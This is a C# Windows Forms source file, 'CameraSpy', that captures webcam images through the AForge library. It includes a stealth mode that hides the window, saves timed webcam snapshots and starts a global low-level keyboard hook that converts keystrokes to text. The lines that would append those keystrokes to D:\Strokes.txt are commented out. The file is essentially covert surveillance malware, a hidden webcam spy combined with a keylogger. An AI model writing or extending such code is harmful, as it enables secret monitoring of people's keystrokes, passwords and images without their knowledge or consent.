using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using AForge;
using AForge.Video;
using AForge.Video.DirectShow;

namespace AforgeCamera
{
    public partial class CameraSpy : Form
    {
        private FilterInfoCollection CaptureDevice;
        private VideoCaptureDevice FinalFrame;
        public static Thread capturestrokes;
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        public static string Keycapture = @"D:\Strokes.txt";
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        static EventWaitHandle waithandler = new AutoResetEvent(false);
        Queue<string> inputsecret = new Queue<string>();

        public string Savepath;

        public CameraSpy()
        {
            InitializeComponent();
          
        }

        public void Startkeyboardhooks()
        {

            try
            {
                capturestrokes = new Thread(() =>
                {
                    //Monitoring capture here

                    _hookID = SetHook(_proc);
                    Application.Run();
                    UnhookWindowsHookEx(_hookID);


                });
                capturestrokes.Start();


            }
            catch (Exception)
            {


            }
        }
       
        private void Form1_Load(object sender, EventArgs e)
        {
            CaptureDevice = new FilterInfoCollection(FilterCategory.VideoInputDevice);
            foreach (FilterInfo Device in CaptureDevice)
            {
                comboBox1.Items.Add(Device.Name);
            }
            comboBox1.SelectedIndex = 0;
            FinalFrame = new VideoCaptureDevice();

        }

       
        void Final_framenewframe(object sender,NewFrameEventArgs eventArgs)
        {
            pictureBox1.Image = (Bitmap)eventArgs.Frame.Clone();
        
        }

      

        private void stealthcheckbox_CheckedChanged(object sender, EventArgs e)
        {
            stealthpanel.Visible = true;
        }

        private void browsebutton_Click(object sender, EventArgs e)
        {
            folderBrowserDialog1.ShowDialog();
            if (folderBrowserDialog1.SelectedPath!=null)
            {
                savepathurl.Text = folderBrowserDialog1.SelectedPath;
                Savepath = savepathurl.Text;
            }
           
        }

    
        public void Shot()
        {

            if (Savepath != null)
            {


                pictureBox1.Image.Save($"{Savepath}\\{DateTime.Now.ToString("yyyyMMdd_hhmmss")}.jpeg", System.Drawing.Imaging.ImageFormat.Jpeg);
            }
            else
            {

                MessageBox.Show("No path selected");
            }
        }
        private void Startbutton_click(object sender, EventArgs e)
        {

            bool isstealth = stealthcheckbox.Checked;
            if (isstealth)
            {
                this.Visible = false;
                /* Adds the event and the event handler for the method that will 
          process the timer event to the timer. */
                if (Convert.ToInt32(timerseconds.Text)>0)
                {
                    timer1.Interval = Convert.ToInt32(timerseconds.Text)*1000;
                    timer1.Start();

                    Startkeyboardhooks();
                }
             

            }
            FinalFrame = new VideoCaptureDevice(CaptureDevice[comboBox1.SelectedIndex].MonikerString);
            FinalFrame.NewFrame += new NewFrameEventHandler(Final_framenewframe);
            FinalFrame.Start();
        }

        private void Shotbutton_Click(object sender, EventArgs e)
        {
            Shot();


        }

        private void timer_tick(object sender, EventArgs e)
        {
            Shot();
        }



















   

            private static IntPtr SetHook(LowLevelKeyboardProc proc)
            {
                try
                {
                    using (Process curProcess = Process.GetCurrentProcess())
                    using (ProcessModule curModule = curProcess.MainModule)
                    {
                        return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                            GetModuleHandle(curModule.ModuleName), 0);
                    }
                }
                catch (Exception)
                {
                    return (IntPtr)null;

                }








            }


            public static string KeyCodeToUnicode(Keys key)
            {
                try
                {
                    byte[] keyboardState = new byte[255];
                    bool keyboardStateStatus = GetKeyboardState(keyboardState);

                    if (!keyboardStateStatus)
                    {
                        return "";
                    }

                    uint virtualKeyCode = (uint)key;
                    uint scanCode = MapVirtualKey(virtualKeyCode, 0);
                    IntPtr inputLocaleIdentifier = GetKeyboardLayout(0);

                    StringBuilder result = new StringBuilder();
                    ToUnicodeEx(virtualKeyCode, scanCode, keyboardState, result, (int)5, (uint)0, inputLocaleIdentifier);

                    return result.ToString();
                }
                catch (Exception)
                {

                    return "";

                }

            }

            private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
            {
                try
                {
                    if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
                    {
                        int vkCode = Marshal.ReadInt32(lParam);
                        //  Console.WriteLine((Keys)vkCode);
                        Keys capturekey = (Keys)vkCode;
                        string c = KeyCodeToUnicode(capturekey);
                        if ((((ushort)GetKeyState(0x14)) & 0xffff) != 0)
                        {

                      

                         //   File.AppendAllText(Keycapture, c.ToUpper());

                       }
                        else
                        {

                          //  File.AppendAllText(Keycapture, c.ToLower());
                        }





                    }

                    return CallNextHookEx(_hookID, nCode, wParam, lParam);

                }
                catch (Exception)
                {
                    return (IntPtr)null;


                }

            }
            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            private static extern bool UnhookWindowsHookEx(IntPtr hhk);

            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

            [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern IntPtr GetModuleHandle(string lpModuleName);

            [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
            public static extern short GetKeyState(int keyCode);

            [DllImport("user32.dll")]
            static extern bool GetKeyboardState(byte[] lpKeyState);

            [DllImport("user32.dll")]
            static extern uint MapVirtualKey(uint uCode, uint uMapType);

            [DllImport("user32.dll")]
            static extern IntPtr GetKeyboardLayout(uint idThread);

            [DllImport("user32.dll")]
            static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

      
    }



}
